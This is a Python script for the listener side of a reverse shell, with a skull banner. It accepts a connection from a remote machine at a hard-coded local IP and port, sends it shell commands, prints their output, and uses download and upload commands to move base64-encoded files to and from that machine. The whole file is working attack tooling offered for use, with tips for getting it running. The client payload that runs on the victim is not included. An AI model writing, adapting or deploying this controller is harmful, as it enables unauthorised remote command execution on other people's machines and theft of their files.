#!/usr/bin/python3

# This is a local network reverse shell, not a ton of practical application. But still does the job.# Only displays local network information 

import socket 
from termcolor import colored
import json
import base64

def receiveFile(target):

	data = target.recv(4096)
	data = base64.b64decode(data)
	return data

def sendCommand(data, target):
	try:
		json_data = json.dumps(data)
		target.send(json_data.encode('utf-8'))
	except:
		target.send(json_data)
		print('Send Type Changed, Data May be a File')


def receiveInfo(target):
	
	while True:
		try:
			data = target.recv(1024)
			data = data.decode('utf-8')
			return json.loads(data)
		except ValueError:
			continue

def shell(s, target, ip):
	while True:
		try:
			command = input(str(ip) + '~/% ')
			if command == 'cd':
				print('You must enter a Directory')
			else:
				sendCommand(command, target)
				if command == 'quit':
					#s.close()
					break
				
				elif command[:8] == 'download':

					with open(command[9:], 'wb') as download_file:
					
						download_file_data = receiveFile(target)
						download_file.write(download_file_data)
				
				elif command[:6] == 'upload':
				
					with open(command[7:], 'rb') as upload_file:
						
						sendCommand(base64.b64encode(upload_file.read()), target)
				
				else:
					message = receiveInfo(target)
					print(str(ip) + '>>' + '\n' + message)
		except Exception:
			print(colored('[-]Error Occured Connection Lost', 'red'))
			break
def main():
	
	print(colored("""

                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''

""", 'red'))
	print("""
	     Python Reverse Shell Listener
		""")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	try:
		s.bind(("192.168.1.2", 6996)) # YOU MUST SET THIS BEFORE USE
		s.listen(3)

		print(colored("[*] Listening for Incoming Connections", 'green'))

		target, ip = s.accept()
		print(colored('[+]Connection Established From: %s' % str(ip), 'green'))
		

		shell(s, target, ip)

		s.close()
	except:
		print('[-]Error Occured')
		print(colored("""Troubleshooting Tips:
		
		- Check IP address
	  	   - Run ' curl ifconfig.me ' for global IP (Listener)
	 	   - Run ' ifconfig ' OR ' ip addr show ' for local IP (Host)
		- Check connection
		   - Ensure that your device has a strong internet connection
		- Program was stopped
	   	   - OR
		- Code is bugged and needs to be fixed
		""", 'red'))
if __name__ == '__main__':
	main()
